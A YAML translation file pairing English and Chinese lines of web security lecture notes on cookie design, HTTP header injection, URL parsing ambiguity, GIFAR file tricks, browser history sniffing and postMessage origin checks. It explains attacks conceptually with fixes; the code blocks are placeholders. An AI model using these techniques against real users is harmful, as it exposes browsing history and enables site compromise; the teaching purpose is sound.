   - PREF_IND
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE6]'
 - en: Note that this kind of cookie doesn't expire in the traditional sense (although
     the server will reject the request if Amazon has revoked the user's key).
+  id: totrans-121
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 请注意，这种类型的 cookie 不会在传统意义上过期（尽管如果亚马逊已经撤销用户的密钥，服务器将拒绝请求）。
 - en: You can embed an "expiration" field in a *particular* request, and then hand
     that URL to a third-party, such that, if the third-party waits too long, AWS will
     reject the request as expired.
+  id: totrans-122
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 您可以在*特定*请求中嵌入一个“过期”字段，然后将该 URL 交给第三方，如果第三方等待时间过长，AWS 将拒绝请求并标记为过期。
 - en: '[PRE7]'
+  id: totrans-123
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE7]'
 - en: Note that the format for the string-to-hash should provide unambiguous parsing!
+  id: totrans-124
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 请注意，用于字符串到哈希的格式应提供明确的解析！
 - en: 'Ex: No component should be allowed to embed the escape character, otherwise
     the server-side parser may get confused.'
+  id: totrans-125
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：不应允许任何组件嵌入转义字符，否则服务器端解析器可能会混淆。
 - en: '**Q:** How do you log out with this kind of cookie design? **A:** Impossible,
     if the server is stateless (closing a seesion would require a server-side table
     of revoked cookies).'
+  id: totrans-126
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**问：** 如何使用这种类型的 cookie 设计注销？**答：** 如果服务器是无状态的（关闭会话将需要一个服务器端的撤销 cookie 表），那是不可能的。'
 - en: If server can be stateful, session IDs make this much simpler.
+  id: totrans-127
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果服务器可以保持状态，会话 ID 会使这变得更简单。
 - en: There's a fundamental trade-off between reducing server-side memory state and
     increasing server-side computation overhead for cryptography.
+  id: totrans-128
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 在减少服务器端内存状态和增加服务器端加密计算开销之间存在根本的权衡。
 - en: Alternatives to cookies for session management
+  id: totrans-129
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 用于会话管理的 cookie 替代方案
 - en: Use **HTML5 local storage**, and implement your own authentication in Javascript.
+  id: totrans-130
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 使用**HTML5 本地存储**，并在 Javascript 中实现自己的身份验证。
 - en: Some web frameworks like Meteor do this.
+  id: totrans-131
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 一些 Web 框架像 Meteor 这样做。
 - en: 'Benefit: The cookie is not sent over the network to the server.'
+  id: totrans-132
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 优势：cookie 不会通过网络发送到服务器。
 - en: 'Benefit: Your authentication scheme is not subject to complex same-origin policy
     for cookies (e.g., DOM storage is bound to a single origin, unlike a cookie, which
     can be bound to multiple subdomains).'
+  id: totrans-133
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 优势：您的身份验证方案不受复杂的同源策略对 cookie 的限制（例如，DOM 存储绑定到单个源，而 cookie 可以绑定到多个子域）。
 - en: '**Client-side X.509 certificates.**'
+  id: totrans-134
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**客户端 X.509 证书。**'
 - en: 'Benefit: Web applications can''t steal or explicitly manipulate each other''s
     certificates.'
+  id: totrans-135
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 优势：Web 应用程序无法窃取或明确操纵彼此的证书。
 - en: '**Drawback:** Have weak story for revocation (we''ll talk about this more in
     future lectures).'
+  id: totrans-136
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**缺点：**对吊销的故事说法不够强（我们将在未来的讲座中更多地讨论这个问题）。'
 - en: '**Drawback:** Poor usability---users don''t want to manage a certificate for
     each site that they visit!'
+  id: totrans-137
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**缺点：**用户不想为访问的每个站点管理证书，使用体验差！'
 - en: '**Benefit/drawback:** There isn''t a notion of a session, since the certificate
     is "always on." For important operations, the application will have to prompt
     for a password.'
+  id: totrans-138
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**利弊：**没有会话的概念，因为证书是"始终开启"的。对于重要操作，应用程序将不得不提示输入密码。'
 - en: HTTP protocol ambiguities
+  id: totrans-139
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: HTTP 协议模糊性
 - en: The web stack has some protocol ambiguities that can lead to security holes.
+  id: totrans-140
   prefs: []
   type: TYPE_NORMAL
+  zh: Web 栈存在一些协议模糊性，可能导致安全漏洞。
 - en: HTTP header injection from XMLHttpRequests
+  id: totrans-141
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 来自 XMLHttpRequest 的 HTTP 标头注入
 - en: Javascript can ask browser to add extra headers in the request. So, what happens
     if we do this?
+  id: totrans-142
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Javascript 可以要求浏览器在请求中添加额外的标头。那么，如果我们这样做会发生什么呢？
 - en: '[PRE8]'
+  id: totrans-143
   prefs:
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE8]'
 - en: The server at foo.com may interpret this as two separate requests! Later, **when
     the browser receives the second request, it may overwrite a cache entry belonging
     to bar.com with content from foo.com!**
+  id: totrans-144
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务器在 foo.com 上可能会将其解释为两个单独的请求！稍后，**当浏览器接收到第二个请求时，它可能会用来自 foo.com 的内容覆盖属于 bar.com
+    的缓存条目！**
 - en: '**Solution:** Prevent XMLHttpRequests from setting sensitive fields like `Host:`
     or `Content-Length`.'
+  id: totrans-145
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**解决方案：**防止 XMLHttpRequest 设置敏感字段如 `Host:` 或 `Content-Length`。'
 - en: '**Takehome point:** Unambiguous encoding is critical! Build reliable escaping/encoding!'
+  id: totrans-146
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**要点：**明确的编码至关重要！构建可靠的转义/编码！'
 - en: URL parsing ("The Tangled Web" page 154)
+  id: totrans-147
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: URL 解析（"The Tangled Web" 第 154 页）
 - en: Flash had a slightly different URL parser than the browser.
+  id: totrans-148
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Flash 的 URL 解析器与浏览器略有不同。
 - en: Suppose the URL was http://example.com:80@foo.com/
+  id: totrans-149
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 假设 URL 是 http://example.com:80@foo.com/
 - en: Flash would compute the origin as "example.com".
+  id: totrans-150
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Flash 会将来源计算为 "example.com"。
 - en: Browser would compute the origin as "foo.com".
+  id: totrans-151
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 浏览器会将来源计算为 "foo.com"。
 - en: '**Bad idea:** complex parsing rules just to determine the principal.'
+  id: totrans-152
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**不好的主意：**复杂的解析规则只是为了确定主体。'
 - en: '**Bad idea:** re-implementing complex parsing code.'
+  id: totrans-153
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**不好的主意：**重新实现复杂的解析代码。'
 - en: Here's a **hilarious/terrifying** way to launch attacks using Java applets that
     are stored in the .jar format.
+  id: totrans-154
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这是一个**滑稽/可怕**的发起攻击的方式，使用存储在 .jar 格式中的 Java applet。
 - en: In 2007, Lifehacker.com posted an article which described how you could hide
     .zip files inside of .gif files.
+  id: totrans-155
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 2007 年，Lifehacker.com 发布了一篇文章，描述了如何将 .zip 文件隐藏在 .gif 文件中。
 - en: Leverage the fact that image renderers process a file top-down, whereas decompressors
     for .zip files typically start from the end and go upwards.
+  id: totrans-156
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 利用图像渲染器自上而下处理文件的事实，而 .zip 文件的解压缩器通常从末尾开始向上移动。
 - en: Attackers realized that .jar files are based on the .zip format!
+  id: totrans-157
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 攻击者意识到 .jar 文件基于 .zip 格式！
 - en: '**THUS THE *GIFAR* WAS BORN**: half-gif, half-jar, all-evil.'
+  id: totrans-158
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**因此 *GIFAR* 诞生了：**一半 gif，一半 jar，全是邪恶。'
 - en: 'Really simple to make a GIFAR: Just use "cat" on Linux or "cp" on Windows.'
+  id: totrans-159
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 制作 GIFAR 非常简单：只需在 Linux 上使用 "cat" 或在 Windows 上使用 "cp"。
 - en: Suppose that target.com only allows external parties to upload images objects.
     The attacker can upload a GIFAR, and the GIFAR will pass target.com's image validation
     tests!
+  id: totrans-160
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 假设 target.com 仅允许外部方上传图像对象。攻击者可以上传一个 GIFAR，而该 GIFAR 将通过 target.com 的图像验证测试！
 - en: Then, if the attacker can launch a XSS attack, the attacker can inject HTML
     which refers to the ".gif" as an applet.
+  id: totrans-161
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 然后，如果攻击者能够发起 XSS 攻击，攻击者可以注入引用 ".gif" 的 HTML 作为 applet。
 - en: '[PRE9]'
+  id: totrans-162
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE9]'
 - en: The browser will load that applet and give it the authority of target.com!
+  id: totrans-163
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 浏览器将加载该小程序并赋予其 target.com 的权限！
 - en: Covert channel attacks
+  id: totrans-164
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 隐蔽信道攻击
 - en: Web applications are also vulnerable to covert channel attacks.
+  id: totrans-165
   prefs: []
   type: TYPE_NORMAL
+  zh: Web 应用程序也容易受到隐蔽信道攻击的影响。
 - en: A **covert channel** is a mechanism which allows two applications to exchange
     information, even though the security model prohibits those applications from
     communicating.
+  id: totrans-166
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**隐蔽信道** 是一种机制，允许两个应用程序交换信息，即使安全模型禁止这些应用程序通信。'
 - en: The channel is "covert" because it doesn't use official mechanisms for cross-app
     communication.
+  id: totrans-167
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 该信道是“隐蔽”的，因为它不使用官方的跨应用程序通信机制。
 - en: '**Example #1: CSS-based sniffing attacks**'
+  id: totrans-168
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**示例 #1：基于 CSS 的嗅探攻击**'
 - en: Attacker has a website that he can convince the user to visit.
+  id: totrans-169
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 攻击者有一个可以说服用户访问的网站。
 - en: '**Attacker goal:** Figure out the other websites that the user has visited
     (e.g., to determine the user''s political views, medical history, etc.).'
+  id: totrans-170
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**攻击者目标：** 弄清楚用户访问过的其他网站（例如，确定用户的政治观点、医疗历史等）。'
 - en: '**Exploit vector:** A web browser uses different colors to display visited
     versus unvisited links! So, attacker page can generate a big list of candidate
     URLs, and then inspect the colors to see if the user has visited any of them.'
+  id: totrans-171
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**利用向量：** 网页浏览器使用不同的颜色来显示已访问与未访问的链接！因此，攻击页面可以生成一个候选 URL 的大列表，然后检查颜色以查看用户是否访问过其中任何一个。'
 - en: Can check thousands of URLs a second!
+  id: totrans-172
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 每秒可以检查数千个 URL！
 - en: Can go breadth-first, find hits for top-level domains, then go depth-first for
     each hit.
+  id: totrans-173
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 可以先广度优先，找到顶级域的命中，然后对每个命中进行深度优先。
 - en: '**Fix:** Force getComputedStyle() and related JavaScript interfaces to always
     say that a link is unvisited. [https://blog.mozilla.org/security/2010/03/31/plugging-the-css-history-leak/]'
+  id: totrans-174
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**修复：** 强制 getComputedStyle() 和相关的 JavaScript 接口始终表示链接未访问。[https://blog.mozilla.org/security/2010/03/31/plugging-the-css-history-leak/]'
 - en: '**Example #2: Cache-based attacks**'
+  id: totrans-175
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**示例 #2：基于缓存的攻击**'
 - en: Attacker setup and goal are the same as before.
+  id: totrans-176
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 攻击者的设置和目标与以前相同。
 - en: '**Exploit vector:** It''s much faster for a browser to access data that''s
     cached instead of fetching it over the network. So, attacker page can generate
     a list of candidate images, try to load them, and see which ones load quickly!'
+  id: totrans-177
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**利用向量：** 浏览器访问缓存的数据比通过网络获取数据要快得多。因此，攻击页面可以生成候选图像列表，尝试加载它们，并查看哪些加载速度快！'
 - en: This attack can reveal your location if the candidate images come from geographically
     specific images, e.g., Google Map tiles. [http://w2spconf.com/2014/papers/geo_inference.pdf]
+  id: totrans-178
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果候选图像来自地理特定图像，例如 Google 地图瓦片，此攻击可以揭示您的位置。[http://w2spconf.com/2014/papers/geo_inference.pdf]
 - en: '**Fix:** No good ones. A page could never cache objects, but this will hurt
     performance. But suppose that a site doesn''t cache anything. Is it safe from
     history sniffing? No!'
+  id: totrans-179
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**修复：** 没有好的方法。一个页面永远不会缓存对象，但这会影响性能。但是，假设一个站点不缓存任何内容。那么它是否免受历史嗅探的影响？不是！'
 - en: '**Example #3: DNS-based attacks**'
+  id: totrans-180
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**示例 #3：基于 DNS 的攻击**'
 - en: Attacker setup and goal are the same as before.
+  id: totrans-181
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 攻击者的设置和目标与以前相同。
 - en: '**Exploit vector:** Attacker page generates references to objects in various
     domains. If the user has already accessed objects from that domain, the hostnames
     will already reside in the DNS cache, making subsequent object accesses faster!
     [http://sip.cs.princeton.edu/pub/webtiming.pdf]'
+  id: totrans-182
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**利用向量：** 攻击页面生成对各个域中对象的引用。如果用户已经访问过该域中的对象，主机名将已经存在于 DNS 缓存中，使得后续对象访问更快！[http://sip.cs.princeton.edu/pub/webtiming.pdf]'
 - en: '**Fix:** No good ones. Could use raw IP addresses for links, but this breaks
     a lot of things (e.g., DNS-based load balancing). However, suppose that a site
     doesn''t cache anything and uses raw IP addresses for hostnames. Is it safe from
     history sniffing? No!'
+  id: totrans-183
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**修复：** 没有好的方法。可以使用原始 IP 地址作为链接，但这会破坏很多东西（例如，基于 DNS 的负载平衡）。但是，假设一个站点不缓存任何内容并使用原始
+    IP 地址作为主机名，那么它是否免受历史嗅探的影响？不是！'
 - en: '**Example #4: Rendering attacks.**'
+  id: totrans-184
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**示例 #4：渲染攻击。**'
 - en: Attacker setup and goal are the same as before.
+  id: totrans-185
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 攻击者的设置和目标与以前相同。
 - en: '**Exploit vector:** Attacker page loads a candidate URL in an iframe. Before
     the browser has fetched the content, the attacker page can access ... `window.frames[1].location.href`
     ... and read the value that the attacker set. However, once the browser has fetched
     the content, accessing that reference will return "undefined" due to the same-origin
     policy. So, the attacker can poll the value and see how long it takes to turn
     "undefined". If it takes a long time, the page must not have been cached! [http://lcamtuf.coredump.cx/cachetime/firefox.html]'
+  id: totrans-186
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**利用向量：** 攻击者页面在iframe中加载一个候选URL。在浏览器获取内容之前，攻击者页面可以访问... `window.frames[1].location.href`
+    ...并读取攻击者设置的值。然而，一旦浏览器获取了内容，访问该引用将由于同源策略而返回“未定义”。因此，攻击者可以轮询该值并查看变为“未定义”需要多长时间。如果需要很长时间，那么页面必定没有被缓存！[http://lcamtuf.coredump.cx/cachetime/firefox.html]'
 - en: '**Fix:** Stop using computers?'
+  id: totrans-187
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**修复：** 停止使用计算机？'
 - en: A web page also needs to use postMessage() securely.
+  id: totrans-188
   prefs: []
   type: TYPE_NORMAL
+  zh: 一个网页也需要安全地使用postMessage()。
 - en: Two frames from different origins can use postMessage() to asynchronously exchange
     immutable strings.
+  id: totrans-189
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 来自不同来源的两个框架可以使用postMessage()异步交换不可变字符串。
 - en: 'Sender gets a reference to a window object, and does this: window.postMessage(msg,
     origin);'
+  id: totrans-190
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 发送方获取一个窗口对象的引用，并执行以下操作：window.postMessage(msg, origin);
 - en: Receiver defines an event handler for the special "message" event. The event
     handler receives the msg and the origin.
+  id: totrans-191
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 接收方为特殊的“消息”事件定义事件处理程序。事件处理程序接收消息和来源。
 - en: '**Q:** Why does the receiver have to check the origin of received message?'
+  id: totrans-192
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**Q:** 接收方为什么要检查接收到的消息的来源？'
 - en: '**A:** To perform access control on senders! If the receiver implements sensitive
     functionality, it shouldn''t respond to requests from arbitary origins.'
+  id: totrans-193
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**A:** 为了对发送方执行访问控制！如果接收方实现了敏感功能，它不应该响应来自任意来源的请求。'
 - en: '**Common mistake:** The receiver uses regular expressions to check the sender''s
     origin.'
+  id: totrans-194
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**常见错误：** 接收方使用正则表达式来检查发送方的来源。'
 - en: Even if origin matches /.foo.com/, doesn't mean it's from foo.com! Could be
     "xfoo.com", or "www.foo.com.bar.com".
+  id: totrans-195
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 即使来源匹配 /.foo.com/，也不意味着它来自foo.com！可能是"xfoo.com"，或者"www.foo.com.bar.com"。
 - en: 'More details: [The Postman Always Rings Twice](https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf)'
+  id: totrans-196
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 更多细节：[邮差总是两次敲门](https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf)
 - en: '**Q:** Why does the sender have to specify the intended origin of the receiver?'
+  id: totrans-197
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**Q:** 为什么发送方必须指定接收方的预期来源？'
 - en: '**A:** postMessage() is applied to a window, not an origin.'
+  id: totrans-198
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**A:** postMessage()应用于窗口，而不是来源。'
 - en: Remember that an attacker may be able to navigate a window to a different location.
+  id: totrans-199
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 请记住，攻击者可能能够将窗口导航到不同的位置。
 - en: If the attacker navigates the window, another origin may receive message!
+  id: totrans-200
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果攻击者导航窗口，另一个来源可能会接收消息！
 - en: If the sender explictly specifies a target origin, the browser checks recipient
     origin before delivering the msg.
+  id: totrans-201
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果发送方明确指定目标来源，浏览器在传递消息之前会检查接收方的来源。
 - en: 'More details: [Securing Frame Communication in Browsers](http://css.csail.mit.edu/6.858/2013/readings/post-message.pdf)'
+  id: totrans-202
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 更多细节：[在浏览器中保护框架通信](http://css.csail.mit.edu/6.858/2013/readings/post-message.pdf)
 - en: There are many other aspects to building a secure web application.
+  id: totrans-203
   prefs: []
   type: TYPE_NORMAL
+  zh: 构建安全Web应用程序还有许多其他方面。
 - en: 'Ex: ensure proper access control for server-side operations.'
+  id: totrans-204
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：确保服务器端操作的适当访问控制。
 - en: Django provides Python decorators to check access control rules.
+  id: totrans-205
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Django提供Python装饰器来检查访问控制规则。
 - en: 'Ex: Maintain logs for auditing, prevent an attacker from modifying the log.'
+  id: totrans-206
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：维护日志以进行审计，防止攻击者修改日志。
